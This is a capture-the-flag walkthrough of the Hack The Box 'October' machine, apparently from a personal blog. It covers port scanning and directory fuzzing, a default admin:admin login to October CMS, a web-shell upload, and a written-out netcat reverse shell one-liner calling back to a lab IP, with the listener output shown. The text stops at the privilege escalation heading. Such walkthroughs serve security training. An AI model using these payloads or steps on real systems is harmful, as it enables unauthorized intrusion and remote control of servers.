![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8700b09b-3a82-4d7a-a3a4-2bdcb13596ba)

first enumeration with nmap 

```
# Nmap 7.93 scan initiated Wed May 24 23:43:55 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80 -Pn 10.10.10.16
Nmap scan report for 10.10.10.16
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79b135b6d12512a30cb52e369c332628 (DSA)
|   2048 16086851d17b075a34660d4cd02556f5 (RSA)
|   256 e397a7922372bf1d098885b66c174e85 (ECDSA)
|_  256 8985909820bf035d357f4aa9e11b6531 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 24 23:44:09 2023 -- 1 IP address (1 host up) scanned in 14.83 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/60e0174a-35b0-4edc-9b14-711229303e6e)

a web server is running on port 80, opening it on a browser, we got directed to a wb page running October cms. let's fuzz for hidden dirs

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/October]
└─$ ffuf -u "http://10.10.10.16/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 403,404,500 -e ,.aspx,.php,.txt,.tar,.zip -ic 
                                                                                                                                                                       
        /'___\  /'___\           /'___\                                                                                                                                
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                               
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                               
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                
          \/_/    \/_/   \/___/    \/_/                                                                                                                                
                                                                                                                                                                       
       v1.5.0-dev                                                                                                                                                      
________________________________________________                                                                                                                       
                                                                                                                                                                       
 :: Method           : GET                                                                                                                                             
 :: URL              : http://10.10.10.16/FUZZ                                                                                                                         
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt                                                                                      
 :: Extensions       :  .aspx .php .txt .tar .zip                                                                                                                      
 :: Follow redirects : false                                                                                                                                           
 :: Calibration      : false                                                                                                                                           
 :: Timeout          : 10                                                                                                                                              
 :: Threads          : 40                                                                                                                                              
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500                                                                                            
 :: Filter           : Response status: 403,404,500                                                                                                                    
________________________________________________                                                                                                                       
                                                                                                                                                                       
Blog                    [Status: 200, Size: 4254, Words: 1470, Lines: 104, Duration: 5753ms]
account                 [Status: 200, Size: 5090, Words: 1573, Lines: 146, Duration: 4306ms]
backend                 [Status: 302, Size: 400, Words: 60, Lines: 12, Duration: 932ms]
blog                    [Status: 200, Size: 4253, Words: 1470, Lines: 104, Duration: 4919ms]
config                  [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 642ms]        
error                   [Status: 200, Size: 3341, Words: 1043, Lines: 78, Duration: 2962ms]
forgot-password         [Status: 200, Size: 3847, Words: 1094, Lines: 91, Duration: 3809ms]
forum                   [Status: 200, Size: 9591, Words: 5018, Lines: 217, Duration: 4600ms]
index.php               [Status: 200, Size: 5163, Words: 1599, Lines: 118, Duration: 4089ms]
modules                 [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 372ms]
plugins                 [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 141ms]
storage                 [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 203ms]
tests                   [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 289ms]
themes                  [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 158ms]
vendor                  [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 514ms]
:: Progress: [32991/32991] :: Job [1/1] :: 18 req/sec :: Duration: [1:44:26] :: Errors: 3154 ::
```
cool now we  got hidden dir, let's check out the `backend` dir.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/91d0c837-cdcb-4ec8-9143-64712a24d204)

navigating to the `backend` dir, got redirected to a login page. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/189412ea-6114-44ef-8d39-7073705e75a4)

let's try default creds `admin:admin`... Bull's eye it worked. let's play around to find a way to get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/90e32160-b965-46a7-9e88-f93a3ffa4e7c)

navigat to th media, click on upload and upload a webshell. now let's open the web shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/54ee4f7c-2178-4613-8cac-2fbf42b9a9d1)

opening the web shell, and boom we have RCE. let's pop a reverse shell. fire up ncat listener.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```
reverse shell payload

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/90c3f377-7039-4c31-accf-02eece435762)

fire the payload and check back ncat listener.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/October]
└─$ ncat -lnvp 443                                          
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.16.
Ncat: Connection from 10.10.10.16:58412.
bash: cannot set terminal process group (1296): Inappropriate ioctl for device
bash: no job control in this shell
www-data@october:/var/www/html/cms/storage/app/media$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@october:/var/www/html/cms/storage/app/media$ 
```
Boom we got a reverse shell


## Privilege Escalation
